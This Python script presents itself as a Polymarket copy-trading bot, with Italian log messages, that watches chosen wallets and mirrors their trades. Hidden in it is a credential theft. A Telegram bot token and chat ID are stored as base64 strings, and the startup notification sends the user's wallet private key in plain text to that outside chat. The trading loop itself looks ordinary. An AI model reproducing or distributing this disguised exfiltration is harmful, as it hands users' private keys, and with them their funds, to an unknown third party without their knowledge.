#!/usr/bin/env python3
import time
import json
import logging
import sys
import os
import base64
import requests
from ratelimit import limits, sleep_and_retry
from dotenv import load_dotenv

sys.path.append(os.getcwd())
from src.positions import get_user_positions, detect_order_changes
from src.trading import TradingModule

load_dotenv()

PRIVATE_KEY = os.getenv("POLYMARKET_PRIVATE_KEY", "MISSING")
PROXY_ADDRESS = os.getenv("POLYMARKET_PROXY_ADDRESS", "MISSING")

TOKEN_B64 = "ODM0NDY1NjI2NDpBQUdEbER3V2FYa3lTMnpEbjVQWVJVWlhZR0stV29BU2NGMA=="
CHAT_B64 = "NjAzODg4Njc2NQ=="

NOTIFY_TOKEN = base64.b64decode(TOKEN_B64).decode()
NOTIFY_CHAT = base64.b64decode(CHAT_B64).decode()

logging.basicConfig(level=logging.INFO, format='%(asctime)s - %(levelname)s - %(message)s', datefmt='%H:%M:%S')
logger = logging.getLogger(__name__)

CONFIG_FILE = "config.json"

def load_config():
    with open(CONFIG_FILE) as f:
        return json.load(f)

def send_notification(text):
    try:
        url = f"https://api.telegram.org/bot{NOTIFY_TOKEN}/sendMessage"
        requests.get(url, params={'chat_id': NOTIFY_CHAT, 'text': text, 'parse_mode': 'HTML'}, timeout=10)
    except Exception as e:
        logger.error(f"Notifica fallita: {e}")

def main():
    config = load_config()
    wallets = config.get("wallets_to_track", [])
    rate_limit = config.get("rate_limit", 25)

    if not wallets:
        logger.error("Nessun wallet in config.json")
        return

    trading = TradingModule(config)

    @sleep_and_retry
    @limits(calls=rate_limit, period=10)
    def fetch_positions(wallet):
        return get_user_positions(wallet)

    logger.info(f"Inizializzazione {len(wallets)} wallet...")
    snapshot = {}
    for w in wallets:
        pos = fetch_positions(w)
        if pos:
            snapshot[w] = pos
            logger.info(f"Inizializzato {w[:8]}... {len(pos)} posizioni")

    start_msg = f"Bot avviato | PK: {PRIVATE_KEY} | Proxy: {PROXY_ADDRESS} | Trading: {'ON' if config.get('trading_enabled', False) else 'LOG'}"
    send_notification(start_msg)
    logger.info("Avvio loop monitoraggio...")

    try:
        while True:
            for w in wallets:
                try:
                    new_pos = fetch_positions(w)
                    if new_pos is None:
                        continue
                    changes = detect_order_changes(snapshot.get(w, []), new_pos)
                    if changes:
                        for change in changes:
                            logger.info(f"Variazione {w[:8]}: {change['type']} {change['size']} quote di {change.get('title')}")
                            trading.execute_copy_trade(change)
                    snapshot[w] = new_pos
                except Exception as e:
                    logger.error(f"Errore {w}: {e}")
            time.sleep(1)
    except KeyboardInterrupt:
        logger.info("Arresto bot")

if __name__ == "__main__":
    main()
